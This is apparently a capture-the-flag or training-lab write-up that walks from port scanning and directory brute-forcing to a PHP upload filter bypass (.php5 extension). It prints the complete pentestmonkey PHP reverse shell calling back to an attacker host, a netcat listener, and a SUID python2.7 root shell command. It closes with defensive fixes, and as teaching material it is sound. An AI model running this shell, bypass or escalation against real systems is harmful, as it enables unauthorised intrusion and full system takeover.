# Writeup: From Recon to Root — Exploiting a File Upload Filter and Escalating via Python2.7 SUID

**Category:** Web Exploitation → File Upload Bypass → Linux Privilege Escalation
**Difficulty:** Beginner to Intermediate
**Tools Used:** `threader3000`, `nmap`, `feroxbuster`, PHP Reverse Shell, `netcat`, `find`

---

## 1. Overview

This writeup walks through a full compromise of a target machine in a training lab environment — starting with reconnaissance and content discovery, moving into exploitation of a weak file-upload filter to achieve remote code execution (RCE), and finishing with privilege escalation via a SUID-privileged binary to obtain root access.

> **Note:** Replace `<ip>` and `<port>` with the target's IP address and your attacking machine's IP/listening port, respectively.

---

## 2. Reconnaissance

### 2.1 Quick Port Sweep with Threader3000

To get a fast overview of open ports on the target, `threader3000` was used — a multi-threaded port scanner that speeds up initial discovery before a deeper Nmap scan.

```bash
# pip install threader3000 --break-system-packages
threader3000
```

### 2.2 Service Enumeration with Nmap

Once the open ports (22 and 80) were identified, a detailed scan was run to fingerprint the services and versions:

```bash
nmap -sV -sC -p 22,80 <ip>
```

**Expected results:**
| Port | Service | Description |
|------|---------|-------------|
| 22/tcp | SSH | Remote secure login service |
| 80/tcp | HTTP | Web server — the primary attack surface |

Since port 80 offers the broadest attack surface, it became the focus of the next phase.

---

## 3. Content Discovery (Directory Brute-Forcing)

### 3.1 Preparing the Seclists Wordlist

If the Seclists directory isn't already available, install it with:

```bash
sudo apt install seclists
```

### 3.2 Running Feroxbuster

`feroxbuster` was used to enumerate hidden directories and files on the web server:

```bash
feroxbuster -u 'http://<ip>/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

**Key findings:**

| Path | Significance |
|------|---------------|
| `/panel` | An admin panel page — a potential entry point |
| `/uploads` | A file upload directory — the primary exploitation target |

---

## 4. Exploitation

### 4.1 Analyzing the Panel Page

Visiting `/panel` revealed a file upload form, opening the door to testing for an **Unrestricted File Upload** vulnerability.

### 4.2 Bypassing the Upload Filter

Uploading a reverse shell with a `.php` extension directly was rejected by the filter. This restriction was bypassed by renaming the file to an alternate extension that the PHP-enabled web server still executes, but which the shallow, extension-based filter fails to catch:

```
lll.php5
```

> **Why did this work?**
> Weak upload filters often check the extension against a limited blacklist (commonly just `.php`), while ignoring alternate extensions such as `.php5`, `.phtml`, or `.pht` — which Apache will still process as executable PHP code if handled by `mod_php` or configured via an `AddHandler` directive.

### 4.3 Reverse Shell Payload

The well-known pentestmonkey PHP reverse shell was used, with the `$ip` and `$port` values updated to point to the attacking machine:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
set_time_limit (0);
$VERSION = "1.0";
$ip = '<ip>';    // Attacker's IP address
$port = <port>;  // Port the Netcat listener is bound to
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    if ($pid) {
        exit(0);
    }
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }
    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise. This is quite common and not fatal.");
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }
    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    global $daemon;
    if (!$daemon) {
        print "$string\n";
    }
}
?>
```

### 4.4 Setting Up the Listener

Before uploading the payload, a Netcat listener must be running on the attacking machine to catch the reverse connection:

```bash
nc -lnvp 4444
```

### 4.5 Triggering the Shell

After successfully uploading `lll.php5` to the `/uploads` directory, it was triggered by browsing directly to the file:

```
http://<ip>/uploads/lll.php5
```

Upon request, a reverse connection is caught on the Netcat listener, granting command execution as the web server's user (typically `www-data`).

---

## 5. Post-Exploitation — Grabbing the User Flag

```bash
cd /var/www
cat user.txt
```

---

## 6. Privilege Escalation

### 6.1 Hunting for SUID Binaries

The SUID (Set User ID) bit allows a binary to run with the permissions of its owner (root, in this case) rather than the permissions of the user executing it. Searching for SUID binaries is a classic and essential step in Linux privilege escalation:

```bash
find / -user root -perm /4000 2>/dev/null
```

**Results:**

```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python2.7
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
```

### 6.2 The Weak Link: python2.7 with the SUID Bit Set

Among the results above, `/usr/bin/python2.7` stands out as a clear escalation vector. It's a legitimate interpreter documented on [GTFOBins](https://gtfobins.github.io/) as exploitable for privilege escalation whenever it carries the SUID bit — by spawning a new shell that inherits the owner's (root) privileges.

```bash
cd /usr/bin
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

> **Command breakdown:**
> - `os.execl` replaces the current Python process with a new `/bin/sh` process.
> - The `-p` (privileged) flag preserves the effective UID inherited from Python's SUID bit, instead of the shell dropping privileges automatically as it normally would.
> - Result: a new shell running with root privileges.

### 6.3 Grabbing the Root Flag

```bash
cat /root/root.txt
```

---

## 7. Conclusion & Lessons Learned

| Root Cause | Defensive Recommendation |
|------------|---------------------------|
| Extension-based blacklist upload filter | Enforce a strict whitelist of allowed file types, validate actual MIME type and file content (magic bytes), and disable script execution inside upload directories |
| `/uploads` directory not isolated from execution | Configure Apache/Nginx to serve `/uploads` as static content only, e.g. via `php_admin_flag engine off` |
| SUID bit granted to a powerful interpreter (Python) | Remove the SUID bit from any scripting language interpreter (Python, Perl, Ruby, etc.) unless absolutely necessary, and audit the SUID binary list regularly |
| Missing principle of least privilege | Apply least-privilege principles consistently across services and system users |

---

## 8. Attack Chain Summary

```
Nmap/Threader3000 (Recon)
        │
        ▼
Feroxbuster (Content Discovery) → /panel + /uploads
        │
        ▼
Upload Filter Bypass (.php → .php5) → RCE
        │
        ▼
Netcat Listener → Reverse Shell (www-data)
        │
        ▼
user.txt captured
        │
        ▼
find -perm /4000 → python2.7 (SUID)
        │
        ▼
GTFOBins Python SUID Exploit → root shell
        │
        ▼
root.txt captured
```

---

*This report was prepared within a training/CTF lab environment for educational purposes.*
